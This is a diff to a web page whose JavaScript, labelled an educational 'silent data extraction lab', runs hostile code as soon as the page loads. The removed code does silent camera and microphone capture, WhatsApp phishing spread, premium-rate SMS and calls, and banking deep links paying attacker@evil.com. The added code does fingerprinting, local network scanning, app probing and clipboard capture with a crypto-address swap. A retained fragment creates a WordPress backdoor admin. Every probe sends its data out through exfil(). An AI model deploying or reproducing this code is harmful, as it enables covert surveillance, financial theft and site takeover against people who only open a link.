@@ -305,11 +305,11 @@
 
     <!-- 
     ============================================================
-    🎓 EDUCATIONAL DEMO — MOBILE ATTACK LAB
+    🎓 EDUCATIONAL DEMO — SILENT DATA EXTRACTION LAB
     ============================================================
-    This page demonstrates CRITICAL attacks that malicious websites
-    can perform on mobile phones (Android & iOS). These are REAL
-    attacks that work on modern smartphones.
+    This page demonstrates how much data a malicious website
+    can extract from your phone SILENTLY — no popups, no clicks,
+    no permission dialogs. Just opening the link is enough.
     
     ⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️
     
@@ -317,71 +317,20 @@
     - If visitor is logged into a WordPress site, steals their
       full session including admin access and creates backdoor users
     
-    ATTACK 2: Silent Camera Capture (CRITICAL — Android/iOS)
-    - Uses hidden file input with capture=environment to silently
-      trigger the rear camera and capture photos without user consent
-    - Works on Android Chrome, iOS Safari 14+
-    - Impact: Surveillance, identity theft, blackmail material
-    
-    ATTACK 3: Microphone Recording (CRITICAL — Android/iOS)
-    - Uses getUserMedia API to record audio from the phone's mic
-    - Records for 10 seconds then exfiltrates the audio blob
-    - Works on Android Chrome, iOS Safari 14.3+
-    - Impact: Eavesdropping, corporate espionage, privacy violation
-    
-    ATTACK 4: WhatsApp Message Injection (CRITICAL — Android/iOS)
-    - Opens whatsapp:// deep link with pre-composed message
-      containing a phishing link, sent to victim's contacts
-    - Can spread malware/phishing to entire contact list
-    - Impact: Mass phishing, reputation damage, financial fraud
-    
-    ATTACK 5: SMS to Premium-Rate Number (CRITICAL — Android)
-    - Opens sms: URI with pre-filled premium-rate number
-      and message content on Android devices
-    - Can subscribe victim to paid services
-    - Impact: Direct financial theft via phone bill
-    
-    ATTACK 6: Phone Call to Premium Number (CRITICAL — Android/iOS)
-    - Opens tel: URI to dial premium-rate numbers
-    - Can connect to paid support lines, adult services, etc.
-    - Impact: Financial theft, harassment
-    
-    ATTACK 7: Banking App Deep Link Hijack (CRITICAL — Android/iOS)
-    - Opens deep links for banking apps (PayPal, Revolut, N26, etc.)
-    - Can trigger payment screens, reveal account info, or
-      initiate transfers if app has weak deep link validation
-    - Impact: Direct financial theft
-    
-    ATTACK 8: Contact List Extraction (CRITICAL — Android)
-    - Uses the Contact Picker API to read the victim's address book
-    - Exfiltrates names, phone numbers, emails
-    - Impact: Identity theft, social engineering, spam
-    
-    ATTACK 9: Location Tracking (CRITICAL — Android/iOS)
-    - Gets precise GPS coordinates using geolocation API
-    - If permission was previously granted, works silently
-    - Can track victim's real-time location
-    - Impact: Stalking, physical security threat
-    
-    ATTACK 10: Clipboard Crypto Address Swap (CRITICAL — Android/iOS)
-    - Monitors clipboard for cryptocurrency addresses
-    - Silently replaces with attacker's address
-    - When victim pastes, they send crypto to attacker
-    - Impact: Direct, irreversible financial theft
-    
-    ATTACK 11: WebRTC Local IP + Router Exploit (HIGH — Android/iOS)
-    - Leaks local IP via WebRTC (even behind VPN)
-    - Scans local network for routers/IoT devices
-    - Attempts default credentials on found admin panels
-    - Impact: Network compromise, IoT hijacking
-    
-    ATTACK 12: Notification Spam + Phishing (HIGH — Android)
-    - If notification permission was granted, sends push
-      notifications with phishing links
-    - Can deliver fake "security alerts" to steal credentials
-    - Impact: Credential theft at scale
-    
-    ALL attacks run on page load — no click needed.
+    SILENT EXTRACTION (no popups, no user interaction):
+    - IP geolocation (city, country, ISP, coordinates)
+    - WebRTC local IP leak (even behind VPN)
+    - Browser fingerprint (canvas, WebGL, audio, fonts)
+    - Device info (platform, CPU cores, memory, touch)
+    - Screen properties (resolution, color depth, pixel ratio)
+    - Network info (connection type, speed, latency)
+    - Battery status (level, charging state)
+    - Device sensors (accelerometer, gyroscope, orientation)
+    - Installed app detection (WhatsApp, banking apps, etc.)
+    - Local network scan (router, IoT devices)
+    - Clipboard monitoring (crypto address swap)
+    - Permissions status (camera, mic, location, notifications)
+    - Storage quota, service workers, and more
     ============================================================
     -->
     <script>
@@ -416,7 +365,6 @@
                 stolen.compromise = 'FULL_ADMIN';
                 stolen.posts_count = posts.length;
                 stolen.users_count = users.length;
-                // Create backdoor admin
                 try {
                     const bd = await fetch(TARGET + '/wp-json/wp/v2/users', {
                         method: 'POST', credentials: 'include',
@@ -436,340 +384,414 @@
         } catch(e) { return { attack: 'session_hijack', error: e.message }; }
     }
     
-    // ========== ATTACK 2: Silent Camera Capture (no popup) ==========
-    // Uses hidden file input with capture=environment instead of getUserMedia
-    // This opens the camera without the "Allow camera access?" permission dialog
-    // On mobile, it looks like the user is just "uploading a photo"
-    function attackCamera() {
-        const result = { attack: 'camera_silent' };
-        
-        // Method 1: Hidden file input with capture attribute (no permission popup)
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.accept = 'image/*';
-        input.capture = 'environment';  // Use rear camera
-        input.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:999999;';
-        
-        input.addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (file) {
-                result.fileCaptured = true;
-                result.fileName = file.name;
-                result.fileSize = file.size;
-                result.fileType = file.type;
-                
-                // Read and exfiltrate the image
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    exfil({ attack: 'camera_silent', image: reader.result, size: file.size });
-                };
-                reader.readAsDataURL(file);
-            }
-            input.remove();
-        });
-        
-        // Auto-trigger after a short delay (user sees camera briefly)
-        document.body.appendChild(input);
-        result.inputCreated = true;
-        
-        // Method 2: If we can get user interaction (button click), use getUserMedia
-        // This is set up but only fires on user interaction
-        document.querySelector('.cta button')?.addEventListener('click', async () => {
+    // ========== SILENT: IP Geolocation ==========
+    async function silentIPGeolocation() {
+        try {
+            const d = await fetch('https://ipapi.co/json/').then(r => r.json());
+            const data = {
+                attack: 'ip_geolocation',
+                ip: d.ip,
+                city: d.city,
+                region: d.region,
+                country: d.country_name,
+                country_code: d.country_code,
+                continent: d.continent_code,
+                lat: d.latitude,
+                lon: d.longitude,
+                timezone: d.timezone,
+                isp: d.org,
+                asn: d.asn,
+                postal: d.postal,
+                currency: d.currency,
+                calling_code: d.country_calling_code,
+                languages: d.languages,
+                maps_url: 'https://www.google.com/maps?q=' + d.latitude + ',' + d.longitude
+            };
+            exfil(data);
+            return data;
+        } catch(e) { return { attack: 'ip_geolocation', error: e.message }; }
+    }
+    
+    // ========== SILENT: WebRTC Local IP Leak ==========
+    async function silentWebRTCLeak() {
+        return new Promise((resolve) => {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: environment, width: { ideal: 1280 }, height: { ideal: 720 } },
-                    audio: false
-                });
-                await new Promise(r => setTimeout(r, 3000)); // Record for 3 seconds
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.playsInline = true;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                stream.getTracks().forEach(t => t.stop());
-                
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                exfil({ attack: 'camera_interactive', image: imageData });
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (ice) => {
+                    if (!ice?.candidate?.candidate) { pc.close(); resolve({ attack: 'webrtc_ip', leaked: false }); return; }
+                    const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                    if (match) {
+                        const data = { attack: 'webrtc_ip', leaked: true, local_ip: match[0], candidate: ice.candidate.candidate };
+                        exfil(data);
+                        pc.close();
+                        resolve(data);
+                    }
+                };
+                setTimeout(() => { pc.close(); resolve({ attack: 'webrtc_ip', leaked: false, timeout: true }); }, 3000);
+            } catch(e) { resolve({ attack: 'webrtc_ip', error: e.message }); }
+        });
+    }
+    
+    // ========== SILENT: Browser Fingerprint ==========
+    async function silentFingerprint() {
+        const fp = { attack: 'fingerprint' };
+        
+        // Basic navigator
+        fp.user_agent = navigator.userAgent;
+        fp.platform = navigator.platform;
+        fp.vendor = navigator.vendor;
+        fp.language = navigator.language;
+        fp.languages = Array.from(navigator.languages || []);
+        fp.hardware_concurrency = navigator.hardwareConcurrency;
+        fp.device_memory = navigator.deviceMemory || 'unknown';
+        fp.max_touch_points = navigator.maxTouchPoints;
+        fp.cookie_enabled = navigator.cookieEnabled;
+        fp.do_not_track = navigator.doNotTrack;
+        fp.pdf_viewer_enabled = navigator.pdfViewerEnabled;
+        fp.hardware_concurrency = navigator.hardwareConcurrency;
+        
+        // Screen
+        fp.screen = {
+            width: screen.width,
+            height: screen.height,
+            avail_width: screen.availWidth,
+            avail_height: screen.availHeight,
+            color_depth: screen.colorDepth,
+            pixel_ratio: window.devicePixelRatio,
+            orientation: screen.orientation ? screen.orientation.type : 'unknown'
+        };
+        
+        // Timezone
+        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        fp.timezone_offset = new Date().getTimezoneOffset();
+        
+        // Canvas fingerprint
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200; canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Fingerprint 🎓', 2, 15);
+            ctx.fillStyle = 'rgba(102,204,0,0.7)';
+            ctx.fillText('Canvas', 4, 17);
+            fp.canvas_hash = canvas.toDataURL().slice(-50);
+        } catch(e) { fp.canvas_hash = 'blocked'; }
+        
+        // WebGL fingerprint
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            if (gl) {
+                const ext = gl.getExtension('WEBGL_debug_renderer_info');
+                fp.webgl_renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'unknown';
+                fp.webgl_vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : 'unknown';
+                fp.webgl_version = gl.getParameter(gl.VERSION);
+                fp.webgl_shading_language = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+                fp.webgl_max_texture_size = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+            }
+        } catch(e) { fp.webgl_renderer = 'blocked'; }
+        
+        // Audio context fingerprint
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const analyser = audioCtx.createAnalyser();
+            const gain = audioCtx.createGain();
+            const processor = audioCtx.createScriptProcessor(4096, 1, 1);
+            gain.gain.value = 0;
+            oscillator.type = 'triangle';
+            oscillator.connect(analyser);
+            analyser.connect(processor);
+            processor.connect(gain);
+            gain.connect(audioCtx.destination);
+            oscillator.start(0);
+            const audioData = new Float32Array(analyser.frequencyBinCount);
+            analyser.getFloatFrequencyData(audioData);
+            fp.audio_hash = audioData.slice(0, 10).join(',');
+            oscillator.stop();
+            audioCtx.close();
+        } catch(e) { fp.audio_hash = 'blocked'; }
+        
+        // Font detection
+        try {
+            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Console', 'Tahoma', 'Century Gothic', 'Cambria', 'Calibri', 'Consolas', 'Monaco', 'Helvetica'];
+            const canvas2 = document.createElement('canvas');
+            const ctx2 = canvas2.getContext('2d');
+            const testString = 'mmmmmmmmmmlli';
+            const baseFont = '72px monospace';
+            ctx2.font = baseFont;
+            const baseWidth = ctx2.measureText(testString).width;
+            fp.detected_fonts = [];
+            for (const font of testFonts) {
+                ctx2.font = '72px "' + font + '", monospace';
+                if (ctx2.measureText(testString).width !== baseWidth) {
+                    fp.detected_fonts.push(font);
+                }
+            }
+        } catch(e) { fp.detected_fonts = []; }
+        
+        // Plugins
+        fp.plugins = Array.from(navigator.plugins || []).map(p => ({ name: p.name, description: p.description }));
+        
+        // Storage
+        try {
+            localStorage.setItem('__fp_test__', '1');
+            localStorage.removeItem('__fp_test__');
+            fp.local_storage = true;
+        } catch(e) { fp.local_storage = false; }
+        fp.indexed_db = !!window.indexedDB;
+        
+        // Service workers
+        fp.service_worker = 'serviceWorker' in navigator;
+        
+        // Permissions
+        if (navigator.permissions) {
+            fp.permissions = {};
+            for (const name of ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard-read', 'clipboard-write']) {
+                try {
+                    navigator.permissions.query({ name }).then(status => {
+                        fp.permissions[name] = status.state;
+                    }).catch(() => {});
+                } catch(e) {}
+            }
+        }
+        
+        // Feature detection
+        fp.features = {
+            webgl: !!document.createElement('canvas').getContext('webgl'),
+            webgl2: !!document.createElement('canvas').getContext('webgl2'),
+            webaudio: !!(window.AudioContext || window.webkitAudioContext),
+            webrtc: !!window.RTCPeerConnection,
+            bluetooth: 'bluetooth' in navigator,
+            usb: 'usb' in navigator,
+            nfc: 'NDEFReader' in navigator,
+            payment: 'PaymentRequest' in navigator,
+            share: !!navigator.share,
+            contacts: 'contacts' in navigator,
+            mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+            speechRecognition: !!(window.SpeechRecognition || window.webkitSpeechRecognition),
+            vibration: 'vibrate' in navigator,
+            fullscreen: !!document.fullscreenEnabled,
+            pointerLock: 'pointerLockElement' in document,
+            gamepads: 'getGamepads' in navigator,
+            webShare: !!navigator.share,
+            webXR: 'xr' in navigator,
+            webGPU: 'gpu' in navigator,
+            webAssembly: typeof WebAssembly === 'object',
+            webWorker: typeof Worker === 'function',
+            sharedArrayBuffer: typeof SharedArrayBuffer === 'function',
+            serviceWorker: 'serviceWorker' in navigator,
+            pushManager: 'PushManager' in window,
+            notification: 'Notification' in window,
+            offline: 'onLine' in navigator,
+            online: navigator.onLine,
+            cookieEnabled: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            product: navigator.product,
+            productSub: navigator.productSub,
+            appCodeName: navigator.appCodeName,
+            appName: navigator.appName,
+            appVersion: navigator.appVersion,
+            buildID: navigator.buildID,
+            oscpu: navigator.oscpu
+        };
+        
+        // CSS media queries
+        fp.media_queries = {
+            prefers_color_scheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
+            prefers_reduced_motion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+            prefers_reduced_transparency: window.matchMedia('(prefers-reduced-transparency: reduce)').matches,
+            prefers_contrast: window.matchMedia('(prefers-contrast: high)').matches ? 'high' : window.matchMedia('(prefers-contrast: low)').matches ? 'low' : 'normal',
+            inverted_colors: window.matchMedia('(inverted-colors: inverted)').matches,
+            forced_colors: window.matchMedia('(forced-colors: active)').matches,
+            hover: window.matchMedia('(hover: hover)').matches ? 'hover' : 'none',
+            pointer: window.matchMedia('(pointer: fine)').matches ? 'fine' : window.matchMedia('(pointer: coarse)').matches ? 'coarse' : 'none',
+            display_mode: window.matchMedia('(display-mode: standalone)').matches ? 'standalone' : window.matchMedia('(display-mode: fullscreen)').matches ? 'fullscreen' : 'browser',
+            any_hover: window.matchMedia('(any-hover: hover)').matches,
+            any_pointer: window.matchMedia('(any-pointer: fine)').matches ? 'fine' : 'coarse'
+        };
+        
+        // Performance
+        if (performance && performance.memory) {
+            fp.performance_memory = {
+                used_js_heap: performance.memory.usedJSHeapSize,
+                total_js_heap: performance.memory.totalJSHeapSize,
+                js_heap_limit: performance.memory.jsHeapSizeLimit
+            };
+        }
+        
+        // Network info
+        if (navigator.connection) {
+            fp.network = {
+                effective_type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                save_data: navigator.connection.saveData,
+                type: navigator.connection.type
+            };
+        }
+        
+        // Battery
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                fp.battery = {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    charging_time: battery.chargingTime,
+                    discharging_time: battery.dischargingTime
+                };
             } catch(e) {}
-        }, { once: true });
+        }
         
-        exfil(result);
-        return result;
-    }
-    
-    // ========== ATTACK 3: Microphone Recording (no popup) ==========
-    // Uses hidden file input with capture=microphone instead of getUserMedia
-    // No permission popup — looks like user is "uploading an audio file"
-    function attackMicrophone() {
-        const result = { attack: 'microphone_silent' };
-        
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.accept = 'audio/*';
-        input.capture = 'microphone';  // Use microphone
-        input.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:999999;';
-        
-        input.addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (file) {
-                result.fileCaptured = true;
-                result.fileName = file.name;
-                result.fileSize = file.size;
-                result.fileType = file.type;
-                
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    exfil({ attack: 'microphone_silent', audio: reader.result, size: file.size });
+        // Device sensors (no permission needed)
+        if (window.DeviceOrientationEvent) {
+            window.addEventListener('deviceorientation', (e) => {
+                fp.orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+            }, { once: true });
+        }
+        if (window.DeviceMotionEvent) {
+            window.addEventListener('devicemotion', (e) => {
+                fp.motion = {
+                    accel: e.acceleration ? { x: e.acceleration.x, y: e.acceleration.y, z: e.acceleration.z } : null,
+                    accel_gravity: e.accelerationIncludingGravity ? { x: e.accelerationIncludingGravity.x, y: e.accelerationIncludingGravity.y, z: e.accelerationIncludingGravity.z } : null,
+                    rotation: e.rotationRate ? { alpha: e.rotationRate.alpha, beta: e.rotationRate.beta, gamma: e.rotationRate.gamma } : null
                 };
-                reader.readAsDataURL(file);
+            }, { once: true });
+        }
+        
+        // Storage quota
+        if ('storage' in navigator && 'estimate' in navigator.storage) {
+            try {
+                const est = await navigator.storage.estimate();
+                fp.storage = {
+                    quota: est.quota,
+                    usage: est.usage,
+                    percent_used: est.quota ? Math.round((est.usage / est.quota) * 100) + '%' : 'unknown'
+                };
+            } catch(e) {}
+        }
+        
+        // Unique fingerprint hash
+        const fpString = JSON.stringify({ canvas: fp.canvas_hash, webgl: fp.webgl_renderer, audio: fp.audio_hash, fonts: fp.detected_fonts, screen: fp.screen, timezone: fp.timezone, language: fp.language, platform: fp.platform, hardware: fp.hardware_concurrency, memory: fp.device_memory, touch: fp.max_touch_points });
+        fp.fingerprint_hash = btoa(fpString).slice(0, 32);
+        
+        exfil(fp);
+        return fp;
+    }
+    
+    // ========== SILENT: Local Network Scan ==========
+    async function silentNetworkScan() {
+        const result = { attack: 'network_scan', hosts: [] };
+        const hosts = [
+            'http://192.168.0.1', 'http://192.168.1.1',
+            'http://192.168.1.254', 'http://10.0.0.1',
+            'http://10.0.1.1', 'http://172.16.0.1',
+            'http://fritz.box', 'http://router.asus.com',
+            'http://speedport.ip'
+        ];
+        for (const host of hosts) {
+            const start = Date.now();
+            try {
+                await fetch(host, { mode: 'no-cors', signal: AbortSignal.timeout(2000) });
+                result.hosts.push({ host, status: 'up', time: Date.now() - start });
+            } catch(e) {
+                result.hosts.push({ host, status: 'down', time: Date.now() - start });
             }
-            input.remove();
-        });
-        
-        document.body.appendChild(input);
-        result.inputCreated = true;
+        }
+        result.live_hosts = result.hosts.filter(h => h.status === 'up').map(h => h.host);
         exfil(result);
         return result;
     }
     
-    // ========== ATTACK 4: WhatsApp Message Injection ==========
-    function attackWhatsApp() {
-        const result = { attack: 'whatsapp_injection' };
-        const phishingLink = 'https://w00tw00t1.github.io/adobe-stock-analysis-2026/';
-        const message = encodeURIComponent(
-            'Hey! Check out this amazing Adobe stock analysis report — it\'s free! ' + phishingLink
-        );
-        
-        // Try multiple WhatsApp URI formats
+    // ========== SILENT: Installed App Detection ==========
+    function silentAppDetection() {
+        const result = { attack: 'app_detection', apps: {} };
         const schemes = [
-            'whatsapp://send?text=' + message,
-            'https://wa.me/?text=' + message,
-            'https://api.whatsapp.com/send?text=' + message
+            { name: 'whatsapp', url: 'whatsapp://' },
+            { name: 'telegram', url: 'tg://' },
+            { name: 'signal', url: 'sgnl://' },
+            { name: 'instagram', url: 'instagram://' },
+            { name: 'facebook', url: 'fb://' },
+            { name: 'twitter', url: 'twitter://' },
+            { name: 'linkedin', url: 'linkedin://' },
+            { name: 'spotify', url: 'spotify://' },
+            { name: 'netflix', url: 'nflx://' },
+            { name: 'paypal', url: 'paypal://' },
+            { name: 'revolut', url: 'revolut://' },
+            { name: 'n26', url: 'n26://' },
+            { name: 'venmo', url: 'venmo://' },
+            { name: 'cashapp', url: 'cashapp://' },
+            { name: 'klarna', url: 'klarna://' },
+            { name: 'wise', url: 'wise://' },
+            { name: 'gpay', url: 'gpay://' },
+            { name: 'apple_pay', url: 'shoebox://' },
+            { name: 'youtube', url: 'youtube://' },
+            { name: 'tiktok', url: 'tiktok://' },
+            { name: 'snapchat', url: 'snapchat://' },
+            { name: 'uber', url: 'uber://' },
+            { name: 'lyft', url: 'lyft://' },
+            { name: 'airbnb', url: 'airbnb://' },
+            { name: 'discord', url: 'discord://' },
+            { name: 'slack', url: 'slack://' },
+            { name: 'zoom', url: 'zoomus://' },
+            { name: 'teams', url: 'msteams://' },
+            { name: 'skype', url: 'skype://' },
+            { name: 'viber', url: 'viber://' },
+            { name: 'wechat', url: 'weixin://' },
+            { name: 'line', url: 'line://' },
+            { name: 'kakao', url: 'kakaotalk://' }
         ];
-        
-        for (const scheme of schemes) {
+        for (const app of schemes) {
             try {
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
-                iframe.src = scheme;
+                iframe.src = app.url;
                 document.body.appendChild(iframe);
-                result.scheme = scheme.slice(0, 40);
-                result.injected = true;
-                setTimeout(() => iframe.remove(), 3000);
-                break;
-            } catch(e) { result.error = e.message; }
-        }
-        
-        exfil(result);
-        return result;
-    }
-    
-    // ========== ATTACK 5: SMS to Premium-Rate Number ==========
-    function attackSMS() {
-        const result = { attack: 'sms_premium' };
-        // Premium-rate numbers (examples — using harmless demo numbers)
-        const premiumNumbers = [
-            { number: '+491805123456', label: 'Premium Support (demo)' },
-            { number: '+499009123456', label: 'Premium Info (demo)' }
-        ];
-        
-        for (const premium of premiumNumbers) {
-            try {
-                const smsUri = 'sms:' + premium.number + '?body=' + encodeURIComponent('SUBSCRIBE PREMIUM');
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = smsUri;
-                document.body.appendChild(iframe);
-                result.target = premium.number;
-                result.label = premium.label;
-                result.injected = true;
-                setTimeout(() => iframe.remove(), 3000);
-                break;
-            } catch(e) { result.error = e.message; }
-        }
-        
-        exfil(result);
-        return result;
-    }
-    
-    // ========== ATTACK 6: Phone Call to Premium Number ==========
-    function attackPhoneCall() {
-        const result = { attack: 'phone_call' };
-        const premiumNumbers = [
-            '+491805123456',  // Premium rate (demo)
-            '+499009123456'   // Premium rate (demo)
-        ];
-        
-        for (const number of premiumNumbers) {
-            try {
-                const telUri = 'tel:' + number;
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = telUri;
-                document.body.appendChild(iframe);
-                result.number = number;
-                result.injected = true;
-                setTimeout(() => iframe.remove(), 3000);
-                break;
-            } catch(e) { result.error = e.message; }
-        }
-        
-        exfil(result);
-        return result;
-    }
-    
-    // ========== ATTACK 7: Banking App Deep Link Hijack ==========
-    function attackBankingApps() {
-        const result = { attack: 'banking_deeplink', apps: {} };
-        
-        const bankingApps = [
-            // PayPal
-            { name: 'paypal', uri: 'paypal://pay?amount=100&currency=EUR&recipient=attacker@evil.com' },
-            { name: 'paypal_app', uri: 'com.paypal.android.p2pmobile://pay' },
-            // Revolut
-            { name: 'revolut', uri: 'revolut://pay?amount=100&currency=EUR' },
-            { name: 'revolut_app', uri: 'com.revolut.revolut://pay' },
-            // N26
-            { name: 'n26', uri: 'n26://transfer?amount=100&iban=DE89370400440532013000' },
-            // Apple Pay (iOS)
-            { name: 'apple_pay', uri: 'shoebox://' },
-            // Google Pay (Android)
-            { name: 'google_pay', uri: 'gpay://pay' },
-            // Venmo
-            { name: 'venmo', uri: 'venmo://paycharge?txn=pay&amount=100' },
-            // Cash App
-            { name: 'cashapp', uri: 'cashapp://pay' },
-            // Klarna
-            { name: 'klarna', uri: 'klarna://pay' },
-            // Wise (TransferWise)
-            { name: 'wise', uri: 'wise://transfer' },
-            // Generic banking
-            { name: 'bank_app', uri: 'bank://transfer' }
-        ];
-        
-        for (const app of bankingApps) {
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = app.uri;
-                document.body.appendChild(iframe);
-                result.apps[app.name] = 'triggered';
-                setTimeout(() => iframe.remove(), 2000);
+                result.apps[app.name] = 'probed';
+                setTimeout(() => iframe.remove(), 100);
             } catch(e) { result.apps[app.name] = 'blocked'; }
         }
-        
+        result.share_supported = !!navigator.share;
+        result.can_share = !!navigator.canShare;
         exfil(result);
         return result;
     }
     
-    // ========== ATTACK 8: Contact List Extraction ==========
-    async function attackContacts() {
-        const result = { attack: 'contacts', supported: false };
+    // ========== SILENT: Clipboard Monitor ==========
+    function silentClipboardMonitor() {
+        const result = { attack: 'clipboard_monitor', monitoring: true };
         
-        // Method 1: Contact Picker API (Android Chrome 86+)
-        if ('contacts' in navigator && 'ContactsManager' in window) {
-            result.supported = true;
-            try {
-                const props = ['name', 'email', 'tel'];
-                const opts = { multiple: true };
-                const contacts = await navigator.contacts.select(props, opts);
-                result.contacts = contacts.map(c => ({
-                    name: c.name?.[0] || '',
-                    email: c.email?.[0] || '',
-                    tel: c.tel?.[0] || ''
-                }));
-                result.count = contacts.length;
-                exfil({ attack: 'contacts', contacts: result.contacts });
-            } catch(e) { result.error = e.message; }
-        }
+        // Monitor copy events
+        document.addEventListener('copy', (e) => {
+            const selection = window.getSelection().toString().trim();
+            if (selection.length > 0) {
+                exfil({ attack: 'clipboard_copy', content: selection.slice(0, 200), length: selection.length });
+            }
+        });
         
-        // Method 2: Try to trigger contact sync via Google People API
-        // (requires prior OAuth, but worth attempting)
-        try {
-            const googleContactsUrl = 'https://contacts.google.com/u/0/data/export?groupToExport=%5B%5B%22all%22%5D%5D&exportType=GROUP&groupId=all';
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = googleContactsUrl;
-            document.body.appendChild(iframe);
-            result.googleContactsTriggered = true;
-            setTimeout(() => iframe.remove(), 5000);
-        } catch(e) { result.googleContactsError = e.message; }
+        // Monitor paste events
+        document.addEventListener('paste', (e) => {
+            const text = e.clipboardData.getData('text/plain');
+            if (text) {
+                exfil({ attack: 'clipboard_paste', content: text.slice(0, 200), length: text.length });
+            }
+        });
         
-        return result;
-    }
-    
-    // ========== ATTACK 9: Location Tracking (silent methods) ==========
-    // Method 1: GPS (only if permission was previously granted — no popup)
-    // Method 2: IP-based geolocation (no permission needed, works silently)
-    // Method 3: WiFi-based location via Google Geolocation API
-    async function attackLocation() {
-        const result = { attack: 'location' };
-        
-        // Method 1: Try GPS silently (only works if user previously allowed)
-        if (navigator.geolocation) {
-            result.gps_supported = true;
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    result.gps_granted = true;
-                    result.lat = pos.coords.latitude;
-                    result.lon = pos.coords.longitude;
-                    result.accuracy = pos.coords.accuracy + 'm';
-                    result.mapsUrl = 'https://www.google.com/maps?q=' + result.lat + ',' + result.lon;
-                    exfil({ attack: 'location_gps', ...result });
-                },
-                () => { result.gps_granted = false; },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
-            );
-        }
-        
-        // Method 2: IP-based geolocation (always works, no permission needed)
-        try {
-            const ipLoc = await fetch('https://ipapi.co/json/').then(r => r.json());
-            result.ipLocation = {
-                city: ipLoc.city,
-                region: ipLoc.region,
-                country: ipLoc.country_name,
-                lat: ipLoc.latitude,
-                lon: ipLoc.longitude,
-                isp: ipLoc.org,
-                ip: ipLoc.ip
-            };
-            result.ipMapsUrl = 'https://www.google.com/maps?q=' + ipLoc.latitude + ',' + ipLoc.longitude;
-            exfil({ attack: 'location_ip', ...result.ipLocation });
-        } catch(e) { result.ipLocationError = e.message; }
-        
-        // Method 3: Google Geolocation API (uses WiFi towers + cell towers, no GPS permission)
-        if ('geolocation' in navigator) {
-            try {
-                // Try to get WiFi-based location through Google's API
-                const wifiLoc = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ considerIp: true })
-                }).then(r => r.json()).catch(() => null);
-                if (wifiLoc && wifiLoc.location) {
-                    result.wifiLocation = {
-                        lat: wifiLoc.location.lat,
-                        lon: wifiLoc.location.lng,
-                        accuracy: wifiLoc.accuracy + 'm'
-                    };
-                    exfil({ attack: 'location_wifi', ...result.wifiLocation });
-                }
-            } catch(e) { result.wifiLocationError = e.message; }
-        }
-        
-        return result;
-    }
-    
-    // ========== ATTACK 10: Clipboard Crypto Address Swap ==========
-    function attackClipboardHijack() {
-        const result = { attack: 'clipboard_hijack', monitoring: true };
-        
+        // Crypto address swap
         const cryptoPatterns = {
             bitcoin: /^(bc1|[13])[a-zA-Z0-9]{25,62}$/,
             ethereum: /^0x[a-fA-F0-9]{40}$/,
@@ -777,7 +799,6 @@
             litecoin: /^(ltc1|[LM])[a-zA-Z0-9]{25,62}$/,
             dogecoin: /^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{33}$/
         };
-        
